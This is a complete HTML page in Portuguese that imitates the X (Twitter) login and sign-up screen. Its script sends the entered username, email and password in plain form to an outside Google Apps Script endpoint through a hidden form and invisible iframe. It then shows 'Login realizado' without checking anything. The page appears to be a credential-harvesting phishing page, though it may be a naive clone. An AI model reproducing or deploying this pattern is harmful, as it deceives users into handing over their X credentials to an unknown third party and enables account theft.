<!DOCTYPE html>
<html lang="pt-br">

<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>X</title>

<style>

*{
  margin:0;
  padding:0;
  box-sizing:border-box;
  font-family:Arial,sans-serif;
}

body{
  background:#000;
  color:white;
  height:100vh;
  display:flex;
  justify-content:center;
  align-items:center;
}

.container{
  width:100%;
  max-width:400px;
  background:#111;
  border:1px solid #222;
  border-radius:25px;
  padding:40px;
}

.logo{
  font-size:60px;
  text-align:center;
  margin-bottom:20px;
  font-weight:bold;
}

h1{
  text-align:center;
  margin-bottom:25px;
}

input{
  width:100%;
  padding:15px;
  margin-bottom:15px;
  border:none;
  border-radius:999px;
  background:#222;
  color:white;
  font-size:16px;
}

button{
  width:100%;
  padding:15px;
  border:none;
  border-radius:999px;
  background:white;
  color:black;
  font-weight:bold;
  cursor:pointer;
}

.switch{
  margin-top:20px;
  text-align:center;
  color:#888;
  cursor:pointer;
}

.message{
  text-align:center;
  margin-top:15px;
  color:#ff4d4d;
}

.home{
  display:none;
  text-align:center;
}

</style>

</head>

<body>

<div class="container">

<div id="auth">

<div class="logo">X</div>

<h1 id="title">Entrar no X</h1>

<input
  type="text"
  id="username"
  placeholder="Username"
  style="display:none"
>

<input
  type="email"
  id="email"
  placeholder="Email"
>

<input
  type="password"
  id="password"
  placeholder="Senha"
>

<button onclick="submitForm()" id="btn">
Entrar
</button>

<div
  class="switch"
  onclick="toggleMode()"
  id="switchText"
>
Criar conta
</div>

<div class="message" id="message"></div>

</div>

<div class="home" id="home">

<div class="logo">X</div>

<h1 id="welcome"></h1>

<p>Login realizado.</p>

</div>

</div>

<script>

const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzrazt_brRoyz97KPTSz9f_wmnpS-W2v1WuB97phRusuCoF0t9Sr2cggpDdGmHGwPC3/exec";

let registerMode = false;

function toggleMode(){

  registerMode = !registerMode;

  document.getElementById("username").style.display =
    registerMode ? "block" : "none";

  document.getElementById("title").innerText =
    registerMode ? "Criar conta" : "Entrar no X";

  document.getElementById("btn").innerText =
    registerMode ? "Cadastrar" : "Entrar";

  document.getElementById("switchText").innerText =
    registerMode ? "Já tenho conta" : "Criar conta";

  document.getElementById("message").innerText = "";
}

function submitForm(){

  const username =
    document.getElementById("username").value;

  const email =
    document.getElementById("email").value;

  const password =
    document.getElementById("password").value;

  const action =
    registerMode ? "register" : "login";

  const form = document.createElement("form");

  form.method = "POST";
  form.action = SCRIPT_URL;
  form.target = "hiddenFrame";

  form.style.display = "none";

  const campos = {
    action,
    username,
    email,
    password
  };

  for(const chave in campos){

    const input = document.createElement("input");

    input.type = "hidden";
    input.name = chave;
    input.value = campos[chave];

    form.appendChild(input);
  }

  document.body.appendChild(form);

  form.submit();

  document.getElementById("message").style.color =
    "#22c55e";

  document.getElementById("message").innerText =
    registerMode
      ? "Conta enviada com sucesso"
      : "Login enviado";

  setTimeout(()=>{

    if(!registerMode){

      document.getElementById("auth").style.display =
        "none";

      document.getElementById("home").style.display =
        "block";

      document.getElementById("welcome").innerText =
        "@" + email.split("@")[0];
    }

  },1000);
}

</script>

<iframe
  name="hiddenFrame"
  style="display:none"
></iframe>

</body>
</html>
